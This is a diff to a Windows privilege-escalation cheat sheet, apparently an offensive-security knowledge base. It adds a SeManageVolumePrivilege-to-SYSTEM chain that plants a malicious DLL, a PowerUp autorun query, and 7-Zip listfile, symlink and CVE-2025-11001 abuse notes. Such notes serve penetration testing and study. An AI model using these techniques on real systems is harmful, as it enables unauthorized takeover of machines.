@@ -184,7 +184,7 @@ msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
 ```powershell
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-RegistryAutoRun"
+powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableRegistryAutoRun"
 ```
 
 If an autorun path is writable, replace the binary — triggers on next login.
@@ -211,6 +211,16 @@ whoami /groups | findstr "Mandatory"   # Integrity level
 | `SeRestorePrivilege` | Write any file, modify registry |
 | `SeLoadDriverPrivilege` | Load malicious kernel driver |
 | `SeManageVolumePrivilege` | Write to any volume — overwrite system files |
+
+> [!tip] **SeManageVolumePrivilege → SYSTEM (the underrated one).** It's not obviously abusable, but it lets you grant *full control of `C:\`* to your low-priv user, after which you plant a DLL that a SYSTEM service loads:
+> ```powershell
+> .\SeManageVolumeExploit.exe          # grants Users FullControl over C:\ (github.com/CsEnox/SeManageVolumeExploit)
+> # Now write a payload DLL into a directory a privileged service DLL-searches, e.g. a phantom/hijackable
+> # DLL under C:\Windows\System32\wbem\ or a known missing DLL (tzres.dll, wlbsctrl.dll, etc.)
+> copy evil.dll C:\Windows\System32\wbem\<missing>.dll
+> # Trigger the service (or wait) → your DLL runs as SYSTEM.
+> ```
+> `SeRestorePrivilege`/`SeTakeOwnershipPrivilege` reach the same place differently — overwrite a service binary or hijack an IFEO/`utilman.exe`.
 
 ### SeImpersonatePrivilege — Potato Attacks
 
@@ -683,6 +693,8 @@ accesschk.exe /accepteula -wvu "C:\path\to\task\binary.exe"
 # If writable: replace binary, wait for schedule
 ```
 
+> [!tip] **Task/service that shells out to 7-Zip = a privesc primitive.** If a SYSTEM/admin task runs `7z.exe a backup.zip C:\writable\dir\*`, a filename beginning with **`@`** is read as a *listfile* → plant `@symlink-to-secret` at the top level of that dir to read a privileged file as SYSTEM (the same trick as the Linux box; symlink creation needs `SeCreateSymbolicLink` / Developer Mode — else use an NTFS hardlink). And a task that **auto-extracts** an attacker-supplied ZIP as admin is exposed to **CVE-2025-11001** (crafted-symlink ZIP → arbitrary write outside the extract dir → Startup/service/DLL → SYSTEM, 7-Zip < 25.00). Full write-up + the initial-access **MotW bypass** (CVE-2025-0411): [[Tools/File Transfer/7-Zip|7-Zip]].
+
 ---
 
 ## DLL Hijacking
@@ -977,5 +989,5 @@ OTHER VECTORS
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-28*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
